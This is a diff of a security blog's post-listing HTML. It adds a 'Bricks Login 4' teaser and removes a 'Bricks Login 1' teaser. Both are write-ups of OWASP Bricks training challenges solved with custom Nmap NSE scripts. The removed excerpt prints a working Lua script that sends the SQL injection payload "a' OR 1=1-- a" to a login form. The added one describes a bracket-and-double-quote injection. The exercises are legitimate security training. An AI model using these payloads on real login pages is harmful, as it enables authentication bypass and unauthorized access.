@@ -159,6 +159,20 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">Bricks Login 4
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.
+Challenge Solution Login level 4 is just a SQL injection with bracket and uses double quote. Here’s an example: SQL Query: SELECT * FROM users WHERE name=(&#34;a&#34;) and password=(&#34;a&#34;). We could just modify previous NSE script by changing the query.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-12-03 16:23:38 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;256 words</footer>
+  <a class="entry-link" aria-label="post link to Bricks Login 4" href="https://callmeks.github.io/posts/bricks-login-4/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">Bricks Login 3
     </h2>
   </header>
@@ -184,21 +198,6 @@ Challenge Solution Login level 2 is just a simple SQL injection which javascript
   </div>
   <footer class="entry-footer"><span title='2024-12-03 16:23:33 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;260 words</footer>
   <a class="entry-link" aria-label="post link to Bricks Login 2" href="https://callmeks.github.io/posts/bricks-login-2/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Bricks Login 1
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Challenge Information OWASP Bricks Docker version: here This is a series where I will write my own Nmap NSE script to solve that challenge. This is actually a task given by masta ghimau during MCC 2023.
-Challenge Solution Login level 1 is just a simple SQL injection. The hardest part is writing a custom NSE script.
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 local http = require &#34;http&#34; local shortport = require &#34;shortport&#34; portrule = shortport.http action = function(host,port) local resp,final,query r={} r[&#39;username&#39;]=&#34;a&#39; OR 1=1-- a&#34; r[&#39;passwd&#39;]=&#34;test&#34; r[&#39;submit&#39;]=&#34;Submit&#34; resp = http.post(host,port,&#34;/login-1/index.php&#34;,nil,nil,r) final = string.match(resp.body, &#39;&lt;p&gt;.*alert%-box.-&gt;(.-)&lt;a.*&lt;/p&gt;&#39;) query = string.match(resp.body, &#34;.*SQL Query(.*)&lt;a.*&lt;/div&gt;&#34;) return {payload = r ,SQLQuery = query , result = final} end This code is built based on http-title.nse.
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-12-03 16:23:31 +0800 +08'>December 3, 2024</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;236 words</footer>
-  <a class="entry-link" aria-label="post link to Bricks Login 1" href="https://callmeks.github.io/posts/bricks-login-1/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
